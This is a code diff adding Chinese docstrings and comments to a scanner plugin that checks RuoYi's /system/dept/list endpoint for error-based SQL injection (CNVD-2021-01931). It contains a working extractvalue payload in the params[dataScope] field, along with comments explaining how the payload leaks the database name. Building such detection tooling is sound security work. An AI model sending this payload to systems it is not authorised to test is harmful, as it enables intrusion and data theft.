@@ -1,3 +1,4 @@
+"""若依 /system/dept/list 的 params[dataScope] 参数 SQL 报错注入检测（CNVD-2021-01931）。"""
 # SQL 报错注入（dept）：/system/dept/list 的 params[dataScope] 参数 extractvalue 报错注入
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import host_of, join_url
@@ -45,6 +46,12 @@ class SqlInjectDeptPlugin(PluginBase):
     supports_waf_bypass = True
 
     def verify(self, target, session):
+        """对 /system/dept/list 的 params[dataScope] 参数发起 extractvalue 报错注入探测。
+
+        @param target: 目标站点根 URL
+        @param session: 共享 HTTP 会话（SessionManager 管理连接复用）
+        @return: ScanResult — 响应含 '运行时异常' 或 'database()' 报错特征则 CONFIRMED，否则 SAFE，网络异常则 UNKNOWN
+        """
         host = host_of(target)
         # 原 headers 1:1 保留（含 sec-ch-ua / Sec-Fetch-* / 空 Cookie 等）
         headers = {
@@ -71,6 +78,8 @@ class SqlInjectDeptPlugin(PluginBase):
             "Accept-Encoding": "gzip, deflate, br",
         }
         # 原 data 1:1 保留（含 extractvalue payload，注意此处的空格差异与原脚本一致）
+        # extractvalue(1, concat(0x7e, ...)) 注入原理：0x7e（~）使第二参数成为非法 XPath，
+        # MySQL 报错时把 database() 子查询结果回显进错误信息，无回显场景也可靠关键词判读
         data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
         url = join_url(target, "/system/dept/list")
         try:
